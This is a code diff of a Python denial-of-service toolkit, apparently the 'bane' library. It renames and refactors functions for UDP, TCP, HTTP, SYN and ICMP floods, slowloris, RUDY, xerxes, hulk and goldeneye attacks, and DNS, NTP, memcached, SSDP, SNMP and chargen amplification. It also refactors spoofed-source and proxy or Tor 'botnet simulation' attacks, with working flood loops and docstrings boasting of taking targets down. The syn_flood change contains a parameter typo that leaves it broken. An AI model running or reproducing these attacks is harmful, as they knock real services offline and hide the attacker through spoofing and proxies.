@@ -33,6 +33,8 @@ def get_public_dns(timeout=15):
 def kill():#stop the process
  global stop
  stop=True
+def kill_thread(x):
+    x.join(1)
 def reset():#reset all values
  global counter
  counter=0
@@ -50,8 +52,7 @@ def reset():#reset all values
  pointer=0
  global ue
  ue=[]
-def udp_flood_attack(u,port=80,ports=None,level=3,min_size=10,max_size=10,connection=True,duration=300,limiting=True,logs=True,returning=False):
-  '''
+'''
    this function is for UDP flood attack tests.
    
    u: targeted ip
@@ -88,17 +89,11 @@ def udp_flood_attack(u,port=80,ports=None,level=3,min_size=10,max_size=10,connec
    >>>bane.udp_flood(ip,ports=[21,50,80],level=2)
    
   '''
+def udp_flood(u,port=80,ports=None,interval=0.001,min_size=10,max_size=10,connection=True,duration=300,limiting=True,logs=True,returning=False):
   global udp_counter
+  global stop
+  stop=False
   udp_counter=0
-  global rate1
-  global rate2
-  global counter
-  if level<=1:
-   t=.1
-  elif level==2:
-   t=.01
-  elif level>=3:
-   t=.001
   tm=time.time()
   while (int(time.time()-tm)<=duration):
    try:
@@ -116,21 +111,17 @@ def udp_flood_attack(u,port=80,ports=None,level=3,min_size=10,max_size=10,connec
        msg=msg[0:1400]#make sure all payloads' sizes are on the right range
     s.sendto((msg.encode('utf-8')),(u,p))
     udp_counter+=1
-    rate1+=1
-    rate2+=len(msg)
     if((logs==True) and (int(time.time()-tm)==1)):
-     sys.stdout.write("\rStats=> Packets sent: {} | Rate: {} packets/s  {} bytes/s".format(udp_counter,rate1,rate2))
+     sys.stdout.write("\rStats=> Packets sent: {}".format(udp_counter))
      sys.stdout.flush()
      tm=time.time()
-     rate1=0
-     rate2=0
     if limiting==True:
-     time.sleep(t)
+     time.sleep(interval)
    except KeyboardInterrupt:
     break
    except Exception as e:
     try:
-     time.sleep(t)
+     time.sleep(interval)
     except:
      pass
   print('')
@@ -149,6 +140,7 @@ class tcfld(threading.Thread):
   self.speed=speed
   self.packs2=packs2
   self.packs1=packs1
+  time.sleep(2)#give time for all threads to be created
   while (stop!=True):
     try:
      s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
@@ -179,6 +171,15 @@ class tcfld(threading.Thread):
     except Exception as e:
      pass
     time.sleep(.1)
+  self.target=None
+  self.port=None
+  self.timeout=None
+  self.tor=None
+  self.minsize=None
+  self.maxsize=None
+  self.speed=None
+  self.packs2=None
+  self.packs1=None
 '''
   usage:
 
@@ -190,7 +191,7 @@ class tcfld(threading.Thread):
   threads: (set by default to: 256) threads to use
   timeout: (set by default to: 5) timeout flag
 '''
-def tcp_flood_attack(u,p=80,min_size=10,max_size=50,threads=256,timeout=5,round_min=5,round_max=15,level=1,duration=300,logs=True,returning=False,set_tor=False):
+def tcp_flood(u,p=80,min_size=10,max_size=50,threads=256,timeout=5,round_min=5,round_max=15,interval=0.1,duration=300,logs=True,returning=False,set_tor=False):
  thr=[]
  global minsize
  minsize=min_size#payload minimum size
@@ -215,16 +216,7 @@ def tcp_flood_attack(u,p=80,min_size=10,max_size=50,threads=256,timeout=5,round_
  global packs2
  packs2=round_min#minimum number of packets per connection
  global speed#attack speed
- if level<=1:
-  speed=0.1
- elif level==2:
-  speed=0.05
- elif level==3:
-  speed=0.01
- elif level==4:
-  speed=0.005
- elif level>=5:
-  speed=0.001
+ speed=interval
  for x in range(threads):
   try:
    t=tcfld()
@@ -339,6 +331,16 @@ class htflood(threading.Thread):
    except:
     pass
    time.sleep(.1)
+  self.postfmin=None
+  self.target=None
+  self.postmin=None
+  self.postmax=None
+  self.port=None
+  self.timeout=None
+  self.tor=None
+  self.speed=None
+  self.packs2=None
+  self.packs1=None
 '''
    the following functions and clases are for DoS attacks simulations with different tools that have been either originally written in 
    diffferent languages (Perl: slowloris and C: xerxes and slow_read attack...) and rewritten in python and other python tools that are PoC for 
@@ -354,7 +356,7 @@ class htflood(threading.Thread):
 
    there will be lessons how to use them all don't worry guys xD
 '''
-def http_flood_attack(u,p=80,post_field_min=5,post_field_max=10,post_min=50,post_max=500,threads=256,timeout=5,round_min=5,round_max=15,level=1,duration=300,logs=True,returning=False,set_tor=False):
+def http_flood(u,p=80,post_field_min=5,post_field_max=10,post_min=50,post_max=500,threads=256,timeout=5,round_min=5,round_max=15,interval=0.1,duration=300,logs=True,returning=False,set_tor=False):
  '''
    this function is for http flood attack. it connect to a given port and flood it with http requests (GET & POST) with randomly headers values to make each request uniques with bypass caching engines techniques.
    it takes the following parameters:
@@ -399,16 +401,7 @@ def http_flood_attack(u,p=80,post_field_min=5,post_field_max=10,post_min=50,post
  global packs2
  packs2=round_min#minimum number of requests to send per connection
  global speed
- if level<=1:
-  speed=0.1
- elif level==2:
-  speed=0.05
- elif level==3:
-  speed=0.01
- elif level==4:
-  speed=0.005
- elif level>=5:
-  speed=0.001
+ speed=interval
  for x in range(threads):
   try:
    t=htflood()
@@ -534,7 +527,17 @@ class prflood(threading.Thread):
    except:
     pass
    time.sleep(.1)
-def prox_http_flood_attack(u,p=80,threads=100,scraping_timeout=15,timeout=7,http_list=None,socks4_list=None,socks5_list=None,post_field_min=5,post_field_max=10,post_min=50,post_max=500,round_min=5,round_max=15,level=1,duration=3600,logs=True,returning=False):
+  self.postfmin=None
+  self.postfmax=None
+  self.postmin=None
+  self.postmax=None
+  self.target=None
+  self.port=None
+  self.timeout=None
+  self.speed=None
+  self.packs2=None
+  self.packs1=None
+def prox_http_flood(u,p=80,threads=100,scraping_timeout=15,timeout=7,http_list=None,socks4_list=None,socks5_list=None,post_field_min=5,post_field_max=10,post_min=50,post_max=500,round_min=5,round_max=15,interval=0.1,duration=3600,logs=True,returning=False):
  '''
    this function is for http flood attack but it distribute the around the world by passing the requests to thousands of proxies located in many countries (it is stimulation to real life botnet).
    it takes the following parameters:
@@ -594,16 +597,7 @@ def prox_http_flood_attack(u,p=80,threads=100,scraping_timeout=15,timeout=7,http
  global packs2
  packs2=round_min
  global speed
- if level<=1:
-  speed=0.1
- elif level==2:
-  speed=0.05
- elif level==3:
-  speed=0.01
- elif level==4:
-  speed=0.005
- elif level>=5:
-  speed=0.001
+ speed=interval
  for x in range(threads):
   try:
    t=prflood()
@@ -675,7 +669,13 @@ class reqpost(threading.Thread):
    time.sleep(.1)
    if stop==True:
     break
-def torshammer_attack(u,p=80,threads=500,timeout=5,set_tor=False,duration=300,logs=True,max_content_length=15000,min_content_length=10000):
+  self.maxcontent=None
+  self.mincontent=None
+  self.target=None
+  self.port=None
+  self.timeout=None
+  self.tor=None
+def torshammer(u,p=80,threads=500,timeout=5,set_tor=False,duration=300,logs=True,max_content_length=15000,min_content_length=10000):
  '''
     this function is used to do torshammer attack, it connects to an ip or domain with a specific port, sends a POST request with legit http headers values then sends the body slowly to keep the socket open as long as possible. it can use tor as a proxy to anonimize the attack. it supports ssl connections unlike the original tool and some bugs has been fixed and simplified.
     
@@ -793,7 +793,12 @@ class pham(threading.Thread):
    time.sleep(.1)
    if stop==True:
     break
-def prox_hammer_attack(u,p=80,scraping_timeout=15,max_content_length=15000,min_content_length=10000,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=300,logs=True):
+  self.target=None
+  self.port=None
+  self.timeout=None
+  self.maxcontent=None
+  self.mincontent=None
+def prox_hammer(u,p=80,scraping_timeout=15,max_content_length=15000,min_content_length=10000,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=300,logs=True):
  '''
   u: target ip or domain
   p: (set by default to: 80) targeted port
@@ -918,7 +923,19 @@ class rudypost(threading.Thread):
    time.sleep(.1)
    if stop==True:
     break
-def rudy_attack(u,p=80,threads=500,form='q',form_length=0,max_form_length=1000000,min_form_length=10000,page='/',timeout=5,set_tor=False,duration=300,logs=True,wait=-1,max_wait=5,min_wait=1):
+  self.r_wait=None
+  self.r_max=None
+  self.r_min=None
+  self.form_lng=None
+  self.max_fo=None
+  self.min_fo=None
+  self.fo=None
+  self.pag=None
+  self.target=None
+  self.port=None
+  self.timeout=None
+  self.tor=None
+def rudy(u,p=80,threads=500,form='q',form_length=0,max_form_length=1000000,min_form_length=10000,page='/',timeout=5,set_tor=False,duration=300,logs=True,wait=-1,max_wait=5,min_wait=1):
  '''
     this function is used to do R.U.D.Y attack, it connects to an ip or domain with a specific port, sends a POST request with legit http headers values then sends the body slowly to keep the socket open as long as possible. it can use tor as a proxy to anonimize the attack. it supports ssl connections unlike the original tool and some bugs has been fixed and simplified.
     
@@ -1025,7 +1042,12 @@ class xer(threading.Thread):
    except:
     pass
    time.sleep(.3)
-def xerxes_attack(u,p=80,threads=500,timeout=5,duration=300,logs=True,set_tor=False):
+  self.target=None
+  self.port=None
+  self.timeout=None
+  self.tor=None
+  x=None
+def xerxes(u,p=80,threads=500,timeout=5,duration=300,logs=True,set_tor=False):
  '''
    everyone heard about the 'xerxes.c' tool ( https://github.com/zanyarjamal/xerxes/blob/master/xerxes.c ), but not everyone really understand what does it do exactly to take down targets, actually some has claimed that it sends few Gbps :/ (which is something really funny looool) . let me illuminate you: this tool is similar to slowloris, it consume all avaible connections on the server and keep them open as long as possible not by sending partial http headers slowly but by sending "NULL byte character" per connection every 0.3 seconds (so actually it doesn't really send much data). it uses 48 threads and 8 connections per thread, so the maximum number of connections that this tool can create is: 384 connections. that's why it works perfectly against apache for example (maximum number of connections that it handle simultaniously is 256 by dafault) but not against the ones with larger capacity.
 
@@ -1129,7 +1151,11 @@ class pxer(threading.Thread):
    except:
     pass
    time.sleep(.3)
-def prox_xerxes_attack(u,scraping_timeout=15,p=80,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=300,logs=True,level=1):
+  self.target=None
+  self.port=None
+  self.timeout=None
+  x=None
+def prox_xerxes(u,scraping_timeout=15,p=80,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=300,logs=True,level=1):
  '''
   u: target ip or domain
   p: (set by default to: 80) targeted port
@@ -1253,7 +1279,16 @@ class slrd(threading.Thread):
     s.close()
    except Exception as e:
     pass
-def slow_read_attack(u,p=80,threads=500,timeout=5,min_speed=3,max_speed=5,max_read=3,min_read=1,logs=True,set_tor=False,duration=300):
+  self.target=None
+  self.port=None
+  self.timeout=None
+  self.tor=None
+  self.speed=None
+  self.rre2=None
+  self.rre1=None
+  self.sre1=None
+  self.sre2=None
+def slow_read(u,p=80,threads=500,timeout=5,min_speed=3,max_speed=5,max_read=3,min_read=1,logs=True,set_tor=False,duration=300):
  '''
    this tool is to perform slow reading attack. i read about this type of attacks on: https://blog.qualys.com/tag/slow-http-attack and tried to do the same thing in python (but in a better way though :p ). on this attack, the attacker is sending a full legitimate HTTP request but reading it slowly to keep the connection open as long as possible. here im doing it a bit different of the original attack with slowhttptest, im sending a normal HTTP request on each thread then read a small part of it (between 1 to 3 bytes randomly sized) then it sleeps for few seconds (3 to 5 seconds randomly sized too), then it sends another request and keep doing the same and keeping the connection open forever.
 
@@ -1357,6 +1392,13 @@ class apa(threading.Thread):
      time.sleep(self.speed)
    except:
     pass
+  self.target=None
+  self.port=None
+  self.timeout=None
+  self.tor=None
+  self.packs2=None
+  self.packs1=None
+  self.speed=None
 class ptc(threading.Thread):
  def run(self):
   global proxslow_counter
@@ -1365,9 +1407,7 @@ class ptc(threading.Thread):
   self.timeout=_timeout
   self.sre1=sre1
   self.sre2=sre2
-  self.speed=speed
   time.sleep(2)
-  x=pointer
   while (stop!=True):
    try:
     z=random.randint(1,20)
@@ -1414,7 +1454,12 @@ class ptc(threading.Thread):
     s.close()
    except Exception as e:
     pass
-def prox_slow_attack(u,p=80,scraping_timeout=15,threads=500,timeout=5,min_speed=3,max_speed=5,http_list=None,socks4_list=None,socks5_list=None,duration=300,logs=True,returning=False,set_tor=False):
+  self.target=None
+  self.port=None
+  self.timeout=None
+  self.sre1=None
+  self.sre2=None
+def prox_slow(u,p=80,scraping_timeout=15,threads=500,timeout=5,min_speed=3,max_speed=5,http_list=None,socks4_list=None,socks5_list=None,duration=300,logs=True,returning=False,set_tor=False):
  thr=[]
  global proxslow_counter
  proxslow_counter=0
@@ -1484,7 +1529,7 @@ def prox_slow_attack(u,p=80,scraping_timeout=15,threads=500,timeout=5,min_speed=
      print("[*]Done!")
  if returning==True:
   return proxslow_counter
-def apache_killer_attack(u,p=80,threads=256,timeout=5,round_min=5,round_max=15,level=1,duration=300,logs=True,returning=False,set_tor=False):
+def apache_killer(u,p=80,threads=256,timeout=5,round_min=5,round_max=15,interval=0.1,duration=300,logs=True,returning=False,set_tor=False):
  '''
    this is a python version of the apache killer tool which was originally written in perl.
 
@@ -1521,16 +1566,7 @@ def apache_killer_attack(u,p=80,threads=256,timeout=5,round_min=5,round_max=15,l
  global packs2
  packs2=round_min
  global speed
- if level<=1:
-  speed=0.1
- elif level==2:
-  speed=0.05
- elif level==3:
-  speed=0.01
- elif level==4:
-  speed=0.005
- elif level>=5:
-  speed=0.001
+ speed=interval
  for x in range(threads):
   try:
    thr.append(apa().start())
@@ -1620,7 +1656,12 @@ class loris(threading.Thread):
     except:
      pass
   ls=[]
-def slowloris_attack(u,p=80,threads=20,timeout=5,duration=300,logs=True,set_tor=False):
+  self.target=None
+  self.port=None
+  self.timeout=None
+  self.tor=None
+  ls=None
+def slowloris(u,p=80,threads=20,timeout=5,duration=300,logs=True,set_tor=False):
  '''
    this function is for advanced slowloris attack. here this script is acting differently, it uses the threads to consume the target's available connections but without connections' count limit, so it keeps consuming the server's connections till it becomes unavailable.
    on each thread, it opens a connection, sends a partial HTTP request then it append it to a list, it continue doing this without stopping even if the target is down and all of this after each try to open new connection it sends random X-a: header value to keep all created connections open without reaching the timeout value.
@@ -1733,7 +1774,11 @@ class plor(threading.Thread):
      print("socket-->{}".format(ipp))
    except:
     pass
-def prox_slowloris_attack(u,scraping_timeout=15,p=80,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=300,logs=True,level=1):
+  self.target=None
+  self.port=None
+  self.timeout=None
+  self.speed=None
+def prox_slowloris(u,scraping_timeout=15,p=80,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=300,logs=True,level=1):
  '''
   u: target ip or domain
   p: (set by default to: 80) targeted port
@@ -1807,7 +1852,6 @@ class phu(threading.Thread):
   global proxhulk_counter
   self.target=target
   self.timeout=_timeout
-  global httplist
   global stop
   time.sleep(2)
   while (stop!=True):
@@ -1836,6 +1880,8 @@ class phu(threading.Thread):
      print("[!]Requests: {} | Bot: {}".format(proxhulk_counter,pr.split(':')[0]))
    except Exception as e:
     pass
+  self.target=None
+  self.timeout=None
 class hu(threading.Thread):
  def run(self):
   global hulk_counter
@@ -1885,7 +1931,9 @@ class hu(threading.Thread):
        print("Requests: {}".format(hulk_counter))
      except Exception as e:
       pass
-def hulk_attack(u,threads=700,timeout=10,duration=300,logs=True,returning=False,set_tor=False):
+  self.target=None
+  self.timeout=None
+def hulk(u,threads=700,timeout=10,duration=300,logs=True,returning=False,set_tor=False):
  '''
    this function is used for hulk attack with more complex modification (more than 10k useragents and references, also a better way to generate random http GET parameters.
     
@@ -1946,7 +1994,7 @@ def hulk_attack(u,threads=700,timeout=10,duration=300,logs=True,returning=False,
      print("[*]Done!")
  if returning==True:
   return hulk_counter
-def prox_hulk_attack(u,threads=700,scraping_timeout=15,http_list=None,timeout=10,duration=300,logs=True,returning=False):
+def prox_hulk(u,threads=700,scraping_timeout=15,http_list=None,timeout=10,duration=300,logs=True,returning=False):
  '''
 
    it takes the following parameters:
@@ -2141,7 +2189,29 @@ class sflood(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def syn_flood_attack(u,p=80,limiting=True,min_size=10,max_size=50,level=1,source_port=-1,max_port=65535,min_port=1024,ip_range=None,max_window=255,min_window=1,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,window_size=-1,payload=0,min_ttl=64,max_ttl=64,duration=300,logs=True,returning=False):
+  self.minsize=None
+  self.maxsize=None
+  self.speed=None
+  self.target=None
+  dip=None
+  self.port=None
+  self.synf=None
+  self.rstf=None
+  self.pshf=None
+  self.ackf=None
+  self.urgf=None
+  self.finf=None
+  self.winds=None
+  self.paylo=None
+  self.min_win=None
+  self.max_win=None
+  self.ip_seg=None
+  self.maxttl=None
+  self.minttl=None
+  self.s_port=None
+  self.min_por=None
+  self.max_por=None
+def syn_flood(u,p=80,limiting=True,min_size=10,max_size=50,inerval=0.1,source_port=-1,max_port=65535,min_port=1024,ip_range=None,max_window=255,min_window=1,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,window_size=-1,payload=0,min_ttl=64,max_ttl=64,duration=300,logs=True,returning=False):
   '''
    this function is for TCP flags floods with spoofed randomly IPs. you can launch any type of spoofed TCP floods by modifying the parameters (SYN, SYN-ACK, ACK, ACK-PSH, FIN...) and another wonderful thing here is that you can also send either spoofed legitimte HTTP requests (GET & POST), randomly created TCP data (which you can control their size), or just send no data with the spoofed packets, also you can modify the window size and Time To Live (TTL) values for more random and unique packets!!! now this is something you won't fine anywhere else on github or stackoverflow ;).
 
@@ -2161,10 +2231,10 @@ def syn_flood_attack(u,p=80,limiting=True,min_size=10,max_size=50,level=1,source
    example:
 
    #to launch a syn flood
-   >>>bane.syn_flood_attack('8.8.8.8')
+   >>>bane.syn_flood('8.8.8.8')
 
    #to launch ack flood
-   >>>bane.syn_flood_attack('8.8.8.8',syn=0,ack=1)
+   >>>bane.syn_flood('8.8.8.8',syn=0,ack=1)
 
 '''
   thr=[]
@@ -2173,16 +2243,7 @@ def syn_flood_attack(u,p=80,limiting=True,min_size=10,max_size=50,level=1,source
   global maxsize
   maxsize=max_size
   global speed
-  if level<=1:
-   speed=0.1
-  elif level==2:
-   speed=0.05
-  elif level==3:
-   speed=0.01
-  elif level==4:
-   speed=0.005
-  elif level>=5:
-   speed=0.001
+  speed=interval
   if limiting==False:
    speed=0
   global synflood_counter
@@ -2314,7 +2375,18 @@ class udpsp(threading.Thread):
    except:
     pass
    time.sleep(self.speed)
-def spoofed_source_udp_flood_attack(u,p=80,min_size=10,max_size=50,limiting=True,level=1,ip_range=None,source_port=-1,max_port=65535,min_port=1024,threads=100,min_ttl=64,max_ttl=64,duration=300,logs=True,returning=False):
+  self.speed=None
+  self.target=None
+  self.port=None
+  self.maxttl=None
+  self.minttl=None
+  self.minsize=None
+  self.maxsize=None
+  self.ip_seg=None
+  self.s_port=None
+  self.min_por=None
+  self.max_por=None
+def spoofed_udp_flood(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,ip_range=None,source_port=-1,max_port=65535,min_port=1024,threads=100,min_ttl=64,max_ttl=64,duration=300,logs=True,returning=False):
  '''
    this function is for UDP flood attack using spoofed sources
 '''
@@ -2324,16 +2396,7 @@ def spoofed_source_udp_flood_attack(u,p=80,min_size=10,max_size=50,limiting=True
  global maxsize
  maxsize=max_size
  global speed
- if level<=1:
-  speed=0.1
- elif level==2:
-  speed=0.05
- elif level==3:
-  speed=0.01
- elif level==4:
-  speed=0.005
- elif level>=5:
-  speed=0.001
+ speed=interval
  if limiting==False:
   speed=0
  global udpstorm_counter
@@ -2471,7 +2534,18 @@ class ln(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def land_attack(u,p=80,min_size=10,max_size=50,limiting=True,level=1,threads=100,max_window=255,min_window=1,min_ttl=64,max_ttl=64,payload_type=0,window=-1,duration=300,logs=True,returning=False):
+  self.minsize=None
+  self.maxsize=None
+  self.speed=None
+  self.target=None
+  self.port=None
+  self.maxttl=None
+  self.minttl=None
+  self.winds=None
+  self.min_win=None
+  self.max_win=None
+  self.paylo=None
+def land(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,threads=100,max_window=255,min_window=1,min_ttl=64,max_ttl=64,payload_type=0,window=-1,duration=300,logs=True,returning=False):
  '''
    this function is for LAND attack in which we are spoofing the victim's IP and targeted port.
 '''
@@ -2481,16 +2555,7 @@ def land_attack(u,p=80,min_size=10,max_size=50,limiting=True,level=1,threads=100
  global minsize
  minsize=min_size
  global speed
- if level<=1:
-  speed=0.1
- elif level==2:
-  speed=0.05
- elif level==3:
-  speed=0.01
- elif level==4:
-  speed=0.005
- elif level>=5:
-  speed=0.001
+ speed=interval
  if limiting==False:
   speed=0
  global land_counter
@@ -2581,7 +2646,11 @@ class dampli(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def dns_amplification_attack(u,p=80,limiting=True,level=1,servers=[],threads=100,q='ANY',duration=300,logs=True,returning=False):
+  self.speed=None
+  self.target=None
+  self.port=None
+  self.query=None
+def dns_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,q='ANY',duration=300,logs=True,returning=False):
  '''
    this function is for DNS amplification attack using and list of DNS servers provided by the user.
 
@@ -2600,16 +2669,7 @@ def dns_amplification_attack(u,p=80,limiting=True,level=1,servers=[],threads=100
 '''
  thr=[]
  global speed
- if level<=1:
-  speed=0.1
- elif level==2:
-  speed=0.05
- elif level==3:
-  speed=0.01
- elif level==4:
-  speed=0.005
- elif level>=5:
-  speed=0.001
+ speed=interval
  if limiting==False:
   speed=0
  global dnsamplif_counter
@@ -2689,7 +2749,10 @@ class nampli(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def ntp_amplification_attack(u,p=80,limiting=True,level=1,servers=[],threads=100,duration=300,logs=True,returning=False):
+  self.speed=None
+  self.target=None
+  self.port=None
+def ntp_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,duration=300,logs=True,returning=False):
  '''
    this function is for NTP amplification attack using and list of DNS servers provided by the user.
 
@@ -2788,7 +2851,10 @@ class memampli(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def memcache_amplification_attack(u,p=80,limiting=True,level=1,servers=[],threads=100,duration=300,logs=True,returning=False):
+  self.speed=None
+  self.target=None
+  self.port=None
+def memcache_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,duration=300,logs=True,returning=False):
  '''
    this function is for Memcached amplification attack using and list of DNS servers provided by the user.
 
@@ -2808,16 +2874,7 @@ def memcache_amplification_attack(u,p=80,limiting=True,level=1,servers=[],thread
  global memcacheamplif_counter
  memcacheamplif_counter=0
  global speed
- if level<=1:
-  speed=0.1
- elif level==2:
-  speed=0.05
- elif level==3:
-  speed=0.01
- elif level==4:
-  speed=0.005
- elif level>=5:
-  speed=0.001
+ speed=interval
  if limiting==False:
   speed=0
  global stop
@@ -2887,7 +2944,10 @@ class charampli(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def chargen_amplification_attack(u,p=80,limiting=True,level=1,servers=[],threads=100,duration=300,logs=True,returning=False):
+  self.target=None
+  self.speed=None
+  self.port=None
+def chargen_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,duration=300,logs=True,returning=False):
  '''
    this function is for CharGen amplification attack using and list of DNS servers provided by the user.
 
@@ -2907,16 +2967,7 @@ def chargen_amplification_attack(u,p=80,limiting=True,level=1,servers=[],threads
  global chargenamplif_counter
  chargenamplif_counter=0
  global speed
- if level<=1:
-  speed=0.1
- elif level==2:
-  speed=0.05
- elif level==3:
-  speed=0.01
- elif level==4:
-  speed=0.005
- elif level>=5:
-  speed=0.001
+ speed=interval
  if limiting==False:
   speed=0
  global stop
@@ -2986,7 +3037,10 @@ class ssampli(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def ssdp_amplification_attack(u,p=80,limiting=True,level=1,servers=[],threads=100,duration=300,logs=True,returning=False):
+  self.speed=None
+  self.target=None
+  self.port=None
+def ssdp_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,duration=300,logs=True,returning=False):
  '''
    this function is for CharGen amplification attack using and list of DNS servers provided by the user.
 
@@ -3006,16 +3060,7 @@ def ssdp_amplification_attack(u,p=80,limiting=True,level=1,servers=[],threads=10
  global ssdpamplif_counter
  ssdpamplif_counter=0
  global speed
- if level<=1:
-  speed=0.1
- elif level==2:
-  speed=0.05
- elif level==3:
-  speed=0.01
- elif level==4:
-  speed=0.005
- elif level>=5:
-  speed=0.001
+ speed=interval
  if limiting==False:
   speed=0
  global stop
@@ -3085,7 +3130,10 @@ class snampli(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def snmp_amplification_attack(u,p=80,limiting=True,level=1,servers=[],threads=100,duration=300,logs=True,returning=False):
+  self.target=None
+  self.speed=None
+  self.port=None
+def snmp_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,duration=300,logs=True,returning=False):
  '''
    this function is for SNMP amplification attack using and list of DNS servers provided by the user.
 
@@ -3105,16 +3153,7 @@ def snmp_amplification_attack(u,p=80,limiting=True,level=1,servers=[],threads=10
  global snmpamplif_counter
  snmpamplif_counter=0
  global speed
- if level<=1:
-  speed=0.1
- elif level==2:
-  speed=0.05
- elif level==3:
-  speed=0.01
- elif level==4:
-  speed=0.005
- elif level>=5:
-  speed=0.001
+ speed=interval
  if limiting==False:
   speed=0
  global stop
@@ -3191,7 +3230,12 @@ class echst(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def echo_reflection_attack(u,p=80,min_size=10,max_size=50,limiting=True,level=1,servers=[],threads=100,duration=300,logs=True,returning=True):
+  self.target=None
+  self.minsize=None
+  self.maxsize=None
+  self.speed=None
+  self.port=None
+def echo_reflection(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,servers=[],threads=100,duration=300,logs=True,returning=True):
  '''
    this function is for ECHO  reflection attack
 '''
@@ -3203,16 +3247,7 @@ def echo_reflection_attack(u,p=80,min_size=10,max_size=50,limiting=True,level=1,
  global echo_ref_counter
  echo_ref_counter=0
  global speed
- if level<=1:
-  speed=0.1
- elif level==2:
-  speed=0.05
- elif level==3:
-  speed=0.01
- elif level==4:
-  speed=0.005
- elif level>=5:
-  speed=0.001
+ speed=interval
  if limiting==False:
   speed=0
  global stop
@@ -3290,7 +3325,14 @@ class icmpcl(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def icmp_flood_attack(u,p=80,min_size=10,max_size=50,limiting=True,level=1,min_ttl=64,max_ttl=64,threads=100,duration=300,logs=True,returning=False):
+  self.speed=None
+  self.minsize=None
+  self.maxsize=None
+  self.target=None
+  self.port=None
+  self.minttl=None
+  self.maxttl=None
+def icmp_flood(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,min_ttl=64,max_ttl=64,threads=100,duration=300,logs=True,returning=False):
  '''
    this function is for ICMP flood attack
 '''
@@ -3300,16 +3342,7 @@ def icmp_flood_attack(u,p=80,min_size=10,max_size=50,limiting=True,level=1,min_t
  global minsize
  minsize=min_size
  global speed
- if level<=1:
-  speed=0.1
- elif level==2:
-  speed=0.05
- elif level==3:
-  speed=0.01
- elif level==4:
-  speed=0.005
- elif level>=5:
-  speed=0.001
+ speed=interval
  if limiting==False:
   speed=0
  global icmp_counter
@@ -3396,7 +3429,15 @@ class icmpst(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def spoofed_source_icmp_attack(u,p=80,min_size=10,max_size=50,limiting=True,level=1,ip_range=None,min_ttl=64,max_ttl=64,threads=100,duration=300,logs=True,returning=True):
+  self.speed=None
+  self.target=None
+  self.port=None
+  self.minttl=None
+  self.maxttl=None
+  self.minsize=None
+  self.maxsize=None
+  self.ip_seg=None
+def spoofed_icmp_flood(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,ip_range=None,min_ttl=64,max_ttl=64,threads=100,duration=300,logs=True,returning=True):
  '''
    this function is for ICMP flood with spoofed sources
 '''
@@ -3408,16 +3449,7 @@ def spoofed_source_icmp_attack(u,p=80,min_size=10,max_size=50,limiting=True,leve
  global icmpstorm_counter
  icmpstorm_counter=0
  global speed
- if level<=1:
-  speed=0.1
- elif level==2:
-  speed=0.05
- elif level==3:
-  speed=0.01
- elif level==4:
-  speed=0.005
- elif level>=5:
-  speed=0.001
+ speed=interval
  if limiting==False:
   speed=0
  global stop
@@ -3497,7 +3529,13 @@ class blnu(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def blacknurse_attack(u,p=80,limiting=True,level=1,ip_range=None,min_ttl=64,max_ttl=64,threads=100,duration=300,logs=True,returning=False):
+  self.target=None
+  self.speed=None
+  self.port=None
+  self.minttl=None
+  self.maxttl=None
+  self.ip_seg=None
+def blacknurse(u,p=80,limiting=True,interval=0.1,ip_range=None,min_ttl=64,max_ttl=64,threads=100,duration=300,logs=True,returning=False):
  '''
    this function is for "black nurse" attack
 '''
@@ -3505,16 +3543,7 @@ def blacknurse_attack(u,p=80,limiting=True,level=1,ip_range=None,min_ttl=64,max_
  global blacknurse_counter
  blacknurse_counter=0
  global speed
- if level<=1:
-  speed=0.1
- elif level==2:
-  speed=0.05
- elif level==3:
-  speed=0.01
- elif level==4:
-  speed=0.005
- elif level>=5:
-  speed=0.001
+ speed=interval
  if limiting==False:
   speed=0
  global stop
@@ -3647,7 +3676,11 @@ class gldn(threading.Thread):
    except Exception as e:
     pass
    time.sleep(.1)
-def goldeneye_attack(u,p=80,threads=700,flood_method=3,timeout=5,duration=300,logs=True,returning=False):
+  self.target=None
+  self.port=None
+  self.method=None
+  self.timeout=None
+def goldeneye(u,p=80,threads=700,flood_method=3,timeout=5,duration=300,logs=True,returning=False):
  '''
    this function is for goldeneye attack with more effective method that take down the targets and doesn't consume much of your resources! thr reason that the original script pushs too much on your device is the fact that it fabricate he useragents string, random ascii blocks and the http headers on its own for every single request at the same time, so as much as you use more threads it's going to use more of your resources. here i already provided it with more than 10k unique useragents outside all clases (no need to redeclare it inside the class' functions everytime and push on the memory) and just formating the values of the http headers and the ascii strings.
 
@@ -3840,7 +3873,13 @@ class dosecl(threading.Thread):
    except Exception as e:
     pass
    time.sleep(.1)
